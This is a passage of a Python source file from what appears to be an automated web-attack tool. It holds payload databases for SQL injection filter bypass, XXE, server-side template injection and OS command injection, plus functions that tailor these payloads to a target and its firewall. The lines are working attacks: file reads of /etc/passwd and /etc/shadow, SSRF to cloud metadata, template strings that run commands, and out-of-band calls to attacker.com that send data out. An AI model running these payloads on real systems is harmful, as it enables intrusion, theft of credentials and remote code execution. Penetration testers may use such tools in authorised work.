        {"payload": "' 0x27 OR 0x31=0x31--", "db": "mysql", "type": "bypass", "bypasses": ["hex_literal"]},
        {"payload": "1 UNION 0x53454c454354 1,2,3--", "db": "mysql", "type": "bypass", "bypasses": ["hex_keyword"]},
        # Char function
        {"payload": "' CHAR(39)+CHAR(39)='1", "db": "mssql", "type": "bypass", "bypasses": ["char_function"]},
        {"payload": "' CONCAT(CHAR(39),CHAR(39))='", "db": "all", "type": "bypass", "bypasses": ["concat_char"]},
        # Base64 encoding (for some WAFs)
        {"payload": "' OR '1'='1'--", "db": "all", "type": "bypass", "bypasses": ["base64_check"]},
        # Null byte variations
        {"payload": "'%00OR%001=1--", "db": "all", "type": "bypass", "bypasses": ["null_byte_prefix"]},
        {"payload": "OR\x001=1", "db": "all", "type": "bypass", "bypasses": ["null_byte_mid"]},
        {"payload": "1\x00OR\x001=1", "db": "all", "type": "bypass", "bypasses": ["null_byte_no_space"]},
        # Parameter pollution
        {"payload": "id=1&id=1' OR '1'='1", "db": "all", "type": "bypass", "bypasses": ["parameter_pollution"]},
        {"payload": "id=1' OR 1=1--&id=2", "db": "all", "type": "bypass", "bypasses": ["parameter_override"]},
        # JSON pollution
        {"payload": "{\"id\":1,\"id\": \"1' OR '1'='1\"}", "db": "all", "type": "bypass", "bypasses": ["json_duplicate_key"]},
        # Type casting bypass
        {"payload": "' OR 1=1 ORDER BY 1--", "db": "all", "type": "bypass", "bypasses": ["order_by_injection"]},
        {"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/pwned'--", "db": "mysql", "type": "bypass", "bypasses": ["file_write"]},
        # Scientific notation
        {"payload": "1e0OR1e0=1e0", "db": "all", "type": "bypass", "bypasses": ["scientific_notation"]},
        # Float bypass
        {"payload": "1.1OR1.1=1.1", "db": "all", "type": "bypass", "bypasses": ["float_literal"]},
        # Boolean logic variations
        {"payload": "1 || 1=1", "db": "all", "type": "bypass", "bypasses": ["double_pipe"]},
        {"payload": "1 && 1=1", "db": "all", "type": "bypass", "bypasses": ["double_ampersand"]},
        # Like operator bypass
        {"payload": "' OR ''='", "db": "all", "type": "bypass", "bypasses": ["empty_string"]},
        {"payload": "' OR 'x'='x", "db": "all", "type": "bypass", "bypasses": ["self_reference"]},
    ],
}


# ============================================================================
# XXE Payload Database
# ============================================================================

_XXE_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # File disclosure
    "file_disclosure": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "linux",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "windows",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "linux",
        },
    ],
    # SSRF via XXE
    "ssrf": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>',
            "type": "ssrf",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            "type": "ssrf_aws",
        },
    ],
    # Blind XXE with external DTD
    "blind_exfil": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
            "type": "blind",
            "note": "Requires external DTD hosted on attacker server",
        },
    ],
    # Parameter entity XXE
    "parameter_entity": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">%eval;%exfil;]><foo>test</foo>',
            "type": "param_entity",
        },
    ],
    # XInclude
    "xinclude": [
        {
            "payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            "type": "xinclude",
        },
    ],
}


# ============================================================================
# SSTI Payload Database
# ============================================================================

_SSTI_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Detection payloads
    "detection": [
        {"payload": "{{7*7}}", "engine": "jinja2/twig", "expected": "49"},
        {"payload": "${7*7}", "engine": "freemarker/velocity", "expected": "49"},
        {"payload": "#{7*7}", "engine": "thymeleaf", "expected": "49"},
        {"payload": "<%= 7*7 %>", "engine": "erb", "expected": "49"},
        {"payload": "{{7*'7'}}", "engine": "jinja2", "expected": "7777777"},
        {"payload": "{php}echo 7*7;{/php}", "engine": "smarty", "expected": "49"},
        {"payload": "@(1+1)", "engine": "razor", "expected": "2"},
    ],
    # Jinja2 RCE
    "jinja2": [
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "engine": "jinja2",
            "type": "rce",
        },
        {
            "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
            "engine": "jinja2",
            "type": "class_enum",
        },
        {
            "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "engine": "jinja2_flask",
            "type": "rce",
        },
    ],
    # Twig
    "twig": [
        {
            "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "engine": "twig",
            "type": "rce",
        },
    ],
    # Freemarker
    "freemarker": [
        {
            "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            "engine": "freemarker",
            "type": "rce",
        },
    ],
    # Velocity
    "velocity": [
        {
            "payload": '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
            "engine": "velocity",
            "type": "rce",
        },
    ],
}


# ============================================================================
# Command Injection Payload Database
# ============================================================================

_CMD_INJECTION_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Basic command chaining
    "chaining": [
        {"payload": ";id", "os": "linux", "type": "semicolon"},
        {"payload": "|id", "os": "linux", "type": "pipe"},
        {"payload": "||id", "os": "linux", "type": "or"},
        {"payload": "&&id", "os": "linux", "type": "and"},
        {"payload": "`id`", "os": "linux", "type": "backtick"},
        {"payload": "$(id)", "os": "linux", "type": "subshell"},
        {"payload": "&whoami", "os": "windows", "type": "ampersand"},
        {"payload": "|whoami", "os": "windows", "type": "pipe"},
        {"payload": "||whoami", "os": "windows", "type": "or"},
        {"payload": "&&whoami", "os": "windows", "type": "and"},
    ],
    # Time-based blind
    "time_based": [
        {"payload": ";sleep 5", "os": "linux", "type": "time_blind"},
        {"payload": "|sleep 5", "os": "linux", "type": "time_blind"},
        {"payload": "$(sleep 5)", "os": "linux", "type": "time_blind"},
        {"payload": "`sleep 5`", "os": "linux", "type": "time_blind"},
        {"payload": "&ping -n 5 127.0.0.1", "os": "windows", "type": "time_blind"},
        {"payload": "|ping -n 5 127.0.0.1", "os": "windows", "type": "time_blind"},
    ],
    # DNS-based out-of-band
    "oob": [
        {"payload": ";nslookup attacker.com", "os": "linux", "type": "oob_dns"},
        {"payload": "$(nslookup attacker.com)", "os": "linux", "type": "oob_dns"},
        {"payload": ";curl http://attacker.com/", "os": "linux", "type": "oob_http"},
        {"payload": "$(curl http://attacker.com/)", "os": "linux", "type": "oob_http"},
        {"payload": "&nslookup attacker.com", "os": "windows", "type": "oob_dns"},
    ],
    # Bypass techniques
    "bypass": [
        {"payload": ";i]d", "os": "linux", "type": "bypass", "bypasses": ["bracket"]},
        {"payload": ";i'd'", "os": "linux", "type": "bypass", "bypasses": ["quote"]},
        {"payload": ";i$()d", "os": "linux", "type": "bypass", "bypasses": ["empty_var"]},
        {"payload": ";/???/??t /???/p]s]w]", "os": "linux", "type": "bypass", "bypasses": ["glob"]},
        {"payload": "${IFS}id", "os": "linux", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": ";id%0a", "os": "linux", "type": "bypass", "bypasses": ["newline"]},
    ],
}


# ============================================================================
# Payload Generation Functions
# ============================================================================


@register_tool(sandbox_execution=False)
async def generate_smart_payloads(
    vuln_class: str,
    url: str | None = None,
    parameter: str | None = None,
    framework: str | None = None,
    database: str | None = None,
    os: str | None = None,
    waf_type: str | None = None,
    injection_context: str = "html",
    hypothesis_id: str | None = None,
    max_payloads: int = 15,
) -> dict[str, Any]:
    """
    Generate elite context-aware payloads using PayloadContext.
    
    P6 ELITE FEATURE: Intelligent payload generation that:
    - Learns from previous attempts (hypothesis ledger integration)
    - Adapts to target technology stack
    - Avoids blocked patterns
    - Prioritizes payloads similar to successful ones
    - Optimizes for specific frameworks/databases
    
    Args:
        vuln_class: Vulnerability class - "xss", "sqli", "xxe", "ssti", "cmd_injection"
        url: Target URL (optional, for context)
        parameter: Parameter name being tested (optional)
        framework: Detected framework - "django", "laravel", "spring", "flask", etc.
        database: Database type - "mysql", "postgresql", "mssql", "oracle"
        os: Operating system - "linux", "windows"
        waf_type: WAF detected - "cloudflare", "akamai", "modsecurity", "imperva", "f5"
        injection_context: Injection context - "html", "attribute", "javascript", "sql", etc.
        hypothesis_id: Hypothesis ID to learn from (loads failed/successful payloads)
        max_payloads: Maximum payloads to return (default: 15)
    
    Returns:
        Dict with intelligent payload selection and context metadata
    """
    # Build context
    context = PayloadContext(
        url=url or "",
        parameter_name=parameter or "",
        framework=framework,
        database=database,
        os=os,
        waf_detected=waf_type is not None,
        waf_type=waf_type,
        injection_context=injection_context,
    )
    
    # Load learning data from hypothesis ledger if provided
    learning_profile: dict[str, Any] = {}
    surface_ref: str | None = None
    if url and parameter:
        surface_ref = f"{url}::{parameter}"
    elif url:
        surface_ref = url
    elif parameter:
        surface_ref = parameter

    if hypothesis_id or surface_ref:
        try:
            from phantom.tools.hypothesis.hypothesis_actions import get_ledger

            ledger = get_ledger()
            if ledger is not None:
                hyp = ledger.get(hypothesis_id) if hypothesis_id else None
                if hyp is None and surface_ref:
                    hyp = ledger.find_by_surface_and_class(surface_ref, vuln_class)

                profile_surface = hyp.surface if hyp is not None else surface_ref
                if profile_surface:
                    learning_profile = ledger.get_payload_learning_profile(vuln_class, profile_surface, limit=max_payloads)
                    if hyp is not None:
                        context.failed_payloads = [
                            payload for payload in hyp.payloads_tested if payload not in hyp.successful_payloads
                        ]
                    context.successful_payloads = [entry["payload"] for entry in learning_profile.get("successful_payloads", [])]
                    logger.info(
                        "P6: Loaded learning profile for %s with %d successful payloads",
                        profile_surface,
                        len(context.successful_payloads),
                    )
        except Exception as e:
            logger.debug(f"Could not load hypothesis ledger: {e}")
    
    # Generate base payloads using existing functions
    payloads: list[dict[str, Any]] = []
    
    if vuln_class == "xss":
        result = await generate_xss_payloads(
            context=injection_context,
            waf_type=waf_type,
            max_payloads=max_payloads * 2,  # Generate more, filter later
        )
        payloads = result.get("payloads", [])
    
    elif vuln_class == "sqli":
        result = await generate_sqli_payloads(
            db_type=database or "all",
            waf_type=waf_type,
            max_payloads=max_payloads * 2,
        )
        payloads = result.get("payloads", [])
    
    elif vuln_class == "ssti":
        result = await generate_ssti_payloads(
            template_engine=framework,
            max_payloads=max_payloads * 2,
        )
        payloads = result.get("payloads", [])
    
    elif vuln_class == "cmd_injection":
        result = await generate_cmd_injection_payloads(
            os=os or "linux",
            injection_type="all",
            max_payloads=max_payloads * 2,
        )
        payloads = result.get("payloads", [])
    
    elif vuln_class == "xxe":
        result = await generate_xxe_payloads(
            technique="all",
            max_payloads=max_payloads * 2,
        )
        payloads = result.get("payloads", [])
    
    else:
        return {
            "success": False,
            "error": f"Unknown vulnerability class: {vuln_class}",
            "supported": ["xss", "sqli", "xxe", "ssti", "cmd_injection"],
        }
    
    # Apply context-aware filtering
    filtered_payloads = _filter_by_context(payloads, context)
    
    # Optimize for framework if specified
    if framework:
        filtered_payloads = _optimize_for_framework(filtered_payloads, framework)

    # Apply cross-surface learning from confirmed hypotheses when available
    if learning_profile:
        filtered_payloads = _apply_learning_profile(filtered_payloads, learning_profile)
    
    # Generate WAF bypass variations for top payloads
    final_payloads: list[dict[str, Any]] = []
    
    for payload_data in filtered_payloads[:max_payloads]:
        payload_str = payload_data["payload"]
        
        # Add original
        final_payloads.append(payload_data)
        
        # Add WAF bypass variations if WAF detected
        if context.waf_detected and context.waf_type:
            variations = _enhance_payload_for_waf(
                payload=payload_str,
                waf_type=context.waf_type,
                injection_type=vuln_class,
            )
            
            # Add variations (limit to avoid explosion)
            for var in variations[1:4]:  # Skip original, take 3 variations
                var_data = payload_data.copy()
                var_data["payload"] = var
                var_data["waf_bypass_variation"] = True
                final_payloads.append(var_data)
    
    # Limit final output
    final_payloads = final_payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": final_payloads,
        "total_count": len(final_payloads),
        "vuln_class": vuln_class,
        "context": context.to_dict(),
        "intelligence": {
            "framework_optimized": framework is not None,
            "waf_aware": context.waf_detected,
            "learning_enabled": hypothesis_id is not None,
            "tech_stack": {
                "framework": framework,
                "database": database,
                "os": os,
                "waf": waf_type,
            },
        },
        "usage": f"Elite payloads for {vuln_class} optimized for your target tech stack. Test sequentially.",
    }


@register_tool(sandbox_execution=False)
async def generate_xss_payloads(
    context: str = "html",
    waf_type: str | None = None,
    encoding: str | None = None,
    max_payloads: int = 20,
) -> dict[str, Any]:
    """
    Generate context-aware XSS payloads for web application testing.
    
    Generates payloads optimized for specific injection contexts and
    optional WAF bypass techniques.
    
    Args:
        context: Injection context - "html", "attribute", "javascript", 
                 "href", "template", "multi" (default: "html")
        waf_type: WAF to bypass - "cloudflare", "akamai", "modsecurity", 
                  "imperva", "f5", etc. (optional)
        encoding: Output encoding - "url", "html", "base64", "unicode" (optional)
        max_payloads: Maximum number of payloads to return (default: 20)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads based on context
    for category, category_payloads in _XSS_PAYLOADS.items():
        for p in category_payloads:
            # Filter by context if specified
            if context != "all" and p.get("context") not in [context, "multi"]:
                continue
            
            payload_data = {
                "payload": p["payload"],
                "category": category,
                "context": p.get("context", "html"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Add WAF-specific bypass payloads
    if waf_type:
        waf_payloads = _generate_waf_xss_bypasses(waf_type)
        payloads.extend(waf_payloads)
    
    # Apply encoding if requested
    if encoding:
        for p in payloads:
            p["encoded"] = _encode_payload(p["payload"], encoding)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "context": context,
        "waf_bypass": waf_type,
        "encoding": encoding,
        "usage": "Test each payload in the target context. Monitor for script execution.",
    }


@register_tool(sandbox_execution=False)
async def generate_sqli_payloads(
    db_type: str = "all",
    injection_type: str = "all",
    waf_type: str | None = None,
    column_count: int | None = None,
    max_payloads: int = 25,
) -> dict[str, Any]:
    """
    Generate context-aware SQL injection payloads.
    
    Generates payloads for different database backends and injection types.
    
    Args:
        db_type: Target database - "mysql", "postgresql", "mssql", "oracle", "all"
        injection_type: Type of injection - "detection", "union", "time_blind",
                       "error_based", "stacked", "boolean", "all"
        waf_type: WAF to bypass (optional)
        column_count: Number of columns for UNION payloads (optional)
        max_payloads: Maximum payloads to return (default: 25)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _SQLI_PAYLOADS.items():
        # Filter by injection type
        if injection_type != "all" and category != injection_type:
            if category != "waf_bypass":  # Always include bypass payloads if WAF specified
                continue
        
        for p in category_payloads:
            # Filter by database type
            if db_type != "all" and p.get("db") not in [db_type, "all"]:
                continue
            
            payload_data = {
                "payload": p["payload"],
                "category": category,
                "db": p.get("db", "all"),
                "type": p.get("type", "unknown"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Generate UNION payloads with specific column count
    if column_count and column_count > 0:
        union_payloads = _generate_union_payloads(column_count, db_type)
        payloads.extend(union_payloads)
    
    # Add WAF bypass variations
    if waf_type:
        waf_payloads = _generate_waf_sqli_bypasses(waf_type, db_type)
        payloads.extend(waf_payloads)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "db_type": db_type,
        "injection_type": injection_type,
        "waf_bypass": waf_type,
        "usage": "Test payloads in injection points. Monitor for errors, timing, or data extraction.",
    }


@register_tool(sandbox_execution=False)
async def generate_xxe_payloads(
    target_os: str = "linux",
    xxe_type: str = "all",
    target_file: str | None = None,
    callback_url: str | None = None,
    max_payloads: int = 15,
) -> dict[str, Any]:
    """
    Generate XXE (XML External Entity) injection payloads.
    
    Creates payloads for file disclosure, SSRF, and blind XXE attacks.
    
    Args:
        target_os: Target OS - "linux", "windows", "all"
        xxe_type: Type of XXE - "file_disclosure", "ssrf", "blind_exfil", 
                  "parameter_entity", "xinclude", "all"
        target_file: Specific file to read (optional, e.g., "/etc/passwd")
        callback_url: Attacker callback URL for blind XXE (optional)
        max_payloads: Maximum payloads to return (default: 15)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _XXE_PAYLOADS.items():
        if xxe_type != "all" and category != xxe_type:
            continue
        
        for p in category_payloads:
            # Filter by OS
            if target_os != "all" and p.get("os") and p["os"] != target_os:
                continue
            
            payload = p["payload"]
            
            # Customize with target file
            if target_file:
                payload = payload.replace("file:///etc/passwd", f"file://{target_file}")
                payload = payload.replace("file:///c:/windows/win.ini", f"file://{target_file}")
            
            # Customize with callback URL
            if callback_url:
                payload = payload.replace("http://attacker.com", callback_url)
                payload = payload.replace("http://internal-server/", callback_url)
            
            payload_data = {
                "payload": payload,
                "category": category,
                "type": p.get("type", "unknown"),
                "os": p.get("os", "all"),
                "note": p.get("note", ""),
            }
            payloads.append(payload_data)
    
    # Generate custom file reading payloads
    if target_file:
        custom_payloads = _generate_custom_xxe_payloads(target_file, target_os)
        payloads.extend(custom_payloads)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "target_os": target_os,
        "xxe_type": xxe_type,
        "target_file": target_file,
        "callback_url": callback_url,
        "usage": "Submit payloads to XML processing endpoints. Check for file contents or callbacks.",
    }


@register_tool(sandbox_execution=False)
async def generate_ssti_payloads(
    template_engine: str = "all",
    payload_type: str = "all",
    command: str | None = None,
    max_payloads: int = 20,
) -> dict[str, Any]:
    """
    Generate SSTI (Server-Side Template Injection) payloads.
    
    Creates payloads for various template engines including Jinja2, Twig,
    Freemarker, Velocity, and more.
    
    Args:
        template_engine: Target engine - "jinja2", "twig", "freemarker", 
                        "velocity", "erb", "smarty", "thymeleaf", "all"
        payload_type: Type - "detection", "rce", "class_enum", "all"
        command: Custom command to execute (optional, default: "id")
        max_payloads: Maximum payloads to return (default: 20)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _SSTI_PAYLOADS.items():
        for p in category_payloads:
            # Filter by template engine
            engine = p.get("engine", "")
            if template_engine != "all":
                if template_engine not in engine and engine not in template_engine:
                    continue
            
            # Filter by payload type
            p_type = p.get("type", "detection")
            if payload_type != "all" and p_type != payload_type:
                continue
            
            payload = p["payload"]
            
            # Customize command if specified
            if command:
                payload = payload.replace("'id'", f"'{command}'")
                payload = payload.replace('"id"', f'"{command}"')
                payload = payload.replace("('id')", f"('{command}')")
            
            payload_data = {
                "payload": payload,
                "category": category,
                "engine": engine,
                "type": p_type,
                "expected": p.get("expected", ""),
            }
            payloads.append(payload_data)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "template_engine": template_engine,
        "payload_type": payload_type,
        "custom_command": command,
        "usage": "Test detection payloads first to confirm SSTI, then escalate to RCE.",
        "detection_tips": [
            "Look for mathematical expressions being evaluated (49 instead of {{7*7}})",
            "Try different syntax for different engines",
            "Check error messages for template engine hints",
        ],
    }


@register_tool(sandbox_execution=False)
async def generate_cmd_injection_payloads(
    target_os: str = "linux",
    injection_type: str = "all",
    command: str | None = None,
    callback_url: str | None = None,
    max_payloads: int = 25,
) -> dict[str, Any]:
    """
    Generate OS command injection payloads.
    
    Creates payloads for command chaining, time-based blind injection,
    and out-of-band exfiltration.
    
    Args:
        target_os: Target OS - "linux", "windows", "all"
        injection_type: Type - "chaining", "time_based", "oob", "bypass", "all"
        command: Custom command to execute (optional)
        callback_url: Attacker callback URL for OOB (optional)
        max_payloads: Maximum payloads to return (default: 25)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _CMD_INJECTION_PAYLOADS.items():
        if injection_type != "all" and category != injection_type:
            continue
        
        for p in category_payloads:
            # Filter by OS
            if target_os != "all" and p.get("os") != target_os:
                continue
            
            payload = p["payload"]
            
            # Customize command
            if command:
                # Replace default commands
                for default_cmd in ["id", "whoami", "sleep 5", "ping -n 5 127.0.0.1"]:
                    if default_cmd in payload:
                        payload = payload.replace(default_cmd, command)
                        break
            
            # Customize callback URL
            if callback_url:
                payload = payload.replace("attacker.com", callback_url.replace("http://", "").replace("https://", "").split("/")[0])
            
            payload_data = {
                "payload": payload,
                "category": category,
                "os": p.get("os", "all"),
                "type": p.get("type", "unknown"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "target_os": target_os,
        "injection_type": injection_type,
        "custom_command": command,
        "callback_url": callback_url,
        "usage": "Test payloads in command injection points. Monitor for output, timing, or callbacks.",
        "tips": [
            "Start with time-based payloads for blind detection",
            "Use OOB payloads when no direct output is visible",
            "Try multiple chaining operators (;, |, &&, ||)",
        ],
    }


# ============================================================================
# Helper Functions
# ============================================================================


def _encode_payload(payload: str, encoding: str) -> str:
    """Encode payload with specified encoding."""
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "html":
        return html.escape(payload)
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    return payload


def _generate_waf_xss_bypasses(waf_type: str) -> list[dict[str, Any]]:
    """Generate WAF-specific XSS bypass payloads."""
    bypasses: list[dict[str, Any]] = []
    
    waf_techniques: dict[str, list[str]] = {
        "cloudflare": [
            "<a href=javas&#99;ript:alert(1)>click",
            "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
        ],
        "akamai": [
            "<img src=1 onerror\\x00=alert(1)>",
            "<svg><script>alert&#40;1&#41;</script>",
        ],
        "modsecurity": [
            "<svg/onload=prompt(1)>",
            "<object data=javascript:alert(1)>",
            "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click",
        ],
        "imperva": [
            "<svg onload=top[`al`+`ert`](1)>",
            "<img src=x onerror=window['alert'](1)>",
        ],
        "f5": [
            "<img src=x onerror=this['\\x61lert'](1)>",
            "<svg onload=self['ale'+'rt'](1)>",
        ],
    }
    
    for payload in waf_techniques.get(waf_type.lower(), []):
        bypasses.append({
            "payload": payload,
            "category": "waf_bypass",
            "context": "html",
            "bypasses": [waf_type.lower()],
        })
    
    return bypasses


def _generate_waf_sqli_bypasses(waf_type: str, db_type: str) -> list[dict[str, Any]]:
    """Generate WAF-specific SQLi bypass payloads."""
    bypasses: list[dict[str, Any]] = []
    
    waf_techniques: dict[str, list[str]] = {
        "cloudflare": [
            "' /*!50000OR*/ 1=1--",
            "' %0AOR%0A 1=1--",
            "'+/*!0AND*/+1=1--",
        ],
        "akamai": [
            "'-1'='- 1'--",
            "' || 1=1--",
            "'\t\nOR\t\n1=1--",
        ],
        "modsecurity": [
            "' /*!OR*/ 1=1#",
            "' && 1=1--",
            "1' /*!50000ORDER BY*/ 1--",
        ],
    }
    
    for payload in waf_techniques.get(waf_type.lower(), []):
        bypasses.append({
            "payload": payload,
            "category": "waf_bypass",
            "db": db_type if db_type != "all" else "all",
            "type": "bypass",
            "bypasses": [waf_type.lower()],
        })
    
    # ADD: Include extended WAF bypass payloads
    for payload_entry in _SQLI_PAYLOADS.get("waf_bypass_extended", []):
        bypasses.append({
            "payload": payload_entry["payload"],
            "category": "waf_bypass_extended",
            "db": payload_entry.get("db", "all"),
            "type": "bypass",
            "bypasses": payload_entry.get("bypasses", []),
        })
    
    return bypasses


def _generate_union_payloads(column_count: int, db_type: str) -> list[dict[str, Any]]:
    """Generate UNION payloads with specific column count."""
    payloads: list[dict[str, Any]] = []
    
    # NULL-based UNION
    nulls = ",".join(["NULL"] * column_count)
    payloads.append({
        "payload": f"' UNION SELECT {nulls}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    # Number-based UNION
    nums = ",".join(str(i) for i in range(1, column_count + 1))
    payloads.append({
        "payload": f"-1 UNION SELECT {nums}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    # String-based (for finding output columns)
    strings = ",".join([f"'col{i}'" for i in range(1, column_count + 1)])
    payloads.append({
        "payload": f"-1 UNION SELECT {strings}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    return payloads


def _generate_custom_xxe_payloads(target_file: str, target_os: str) -> list[dict[str, Any]]:
    """Generate XXE payloads for specific file."""
    payloads: list[dict[str, Any]] = []
    
    # Standard file entity
    payloads.append({
        "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]><foo>&xxe;</foo>',
        "category": "custom",
        "type": "file",
        "os": target_os,
        "note": f"Read {target_file}",
    })
    
    # PHP filter for base64 encoding (useful for binary/PHP files)
    if target_os == "linux":
        encoded_file = base64.b64encode(target_file.encode()).decode()
        payloads.append({
            "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">]><foo>&xxe;</foo>',
            "category": "custom",
            "type": "file_php",
            "os": "linux",
            "note": f"Read {target_file} with base64 encoding (PHP apps)",
        })
    
    return payloads
